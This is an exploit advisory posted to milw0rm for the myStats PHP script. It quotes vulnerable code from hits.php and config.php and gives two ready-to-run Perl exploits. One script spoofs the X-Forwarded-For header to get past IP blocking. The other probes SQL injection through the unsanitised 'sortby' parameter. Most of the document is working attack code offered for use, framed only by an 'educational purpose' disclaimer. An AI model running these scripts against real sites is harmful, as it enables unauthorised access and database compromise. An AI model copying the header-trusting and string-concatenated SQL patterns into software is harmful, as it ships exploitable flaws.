<html><head><title>myStats (hits.php) Multiple Remote Vulnerabilities Exploit</title></head><pre># myStats (hits.php) Multiple Remote Vulnerabilities Exploit
# url: http://mywebland.com/
#
# Author: JosS
# mail: sys-project[at]hotmail[dot]com
# site: http://spanish-hackers.com
# team: Spanish Hackers Team - [SHT]
#
# This was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.
#
# Greetz To: All Hackers and milw0rm website

---------------------
Break System Block IP
---------------------

&lt;&lt;hits.php&gt;&gt;

7: if (@getenv(&quot;HTTP_X_FORWARDED_FOR&quot;)) 

   { $u_ip = @getenv(&quot;HTTP_X_FORWARDED_FOR&quot;); } 

   else { $u_ip = @getenv(&quot;REMOTE_ADDR&quot;); } 



   if ($u_ip == BLOCK_IP) 

    { return 1; 

13:  exit; } 

&lt;&lt;config.php&gt;&gt;

11: define(&quot;BLOCK_IP&quot;, &quot;127.0.0.1&quot;); 

&lt;&lt;exploit.pl&gt;&gt;

use HTTP::Request;
use LWP::UserAgent;

my $web=&quot;http://localhost/hits.php&quot;;
my $ua=LWP::UserAgent-&gt;new();
$ua-&gt;default_header('X-Forwarded-For' =&gt; &quot;127.1.1.1&quot;);
my $respuesta=HTTP::Request-&gt;new(GET=&gt;$web);
$ua-&gt;timeout(30);
my $response=$ua-&gt;request($respuesta);
$contenido=$response-&gt;content;
if ($response-&gt;is_success)
{
open(FILE,&quot;&gt;&gt;results.txt&quot;);
print FILE &quot;$contenido\n&quot;;
close(FILE);
print &quot;\n[+] Exploit Succesful!\n\n&quot;;
}
else
{
print &quot;\n[-] Exploit Failed!\n\n&quot;;
}

&lt;&lt;proof of concept&gt;&gt;

$ua-&gt;default_header('X-Forwarded-For' =&gt; &quot;127.1.1.1&quot;); --&gt; BREAK BLOCK_IP

-------------
SQL Injection
-------------

&lt;&lt;hits.php&gt;&gt;

63: if (isset($_GET['sortby']))

    {$sortby = $_GET['sortby'];}

    else

    { $sortby =  'timestamp' ;}


    $sql = &quot;SELECT * FROM &quot; . LOG_TBL . &quot; ORDER BY &quot; . $sortby.&quot; DESC LIMIT 0, &quot;. DISPLAY_LOG_NO ;

69: $querylog = mysql_query($sql) or die(&quot;Line 117 Cannot query the database.&lt;br&gt;&quot; . mysql_error());

&lt;&lt;exploit.pl&gt;&gt;

use HTTP::Request;
use LWP::UserAgent;

my $web=&quot;http://localhost/hits.php?sortby=1'&quot;;
my $ua=LWP::UserAgent-&gt;new();
my $respuesta=HTTP::Request-&gt;new(GET=&gt;$web);
$ua-&gt;timeout(30);
my $response=$ua-&gt;request($respuesta);
$contenido=$response-&gt;content;
if ($response-&gt;is_success)
{
if($contenido =~ /You have an error in your SQL syntax;/)
{
print &quot;\n[+] Exploit Succesful!\n&quot;;
print &quot;\n[+] Content:\n&quot;;
print &quot;$contenido\n\n&quot;;
}
}
else
{
print &quot;\n[-] Exploit Failed!\n\n&quot;;
}

# milw0rm.com [2008-10-15]</pre></html>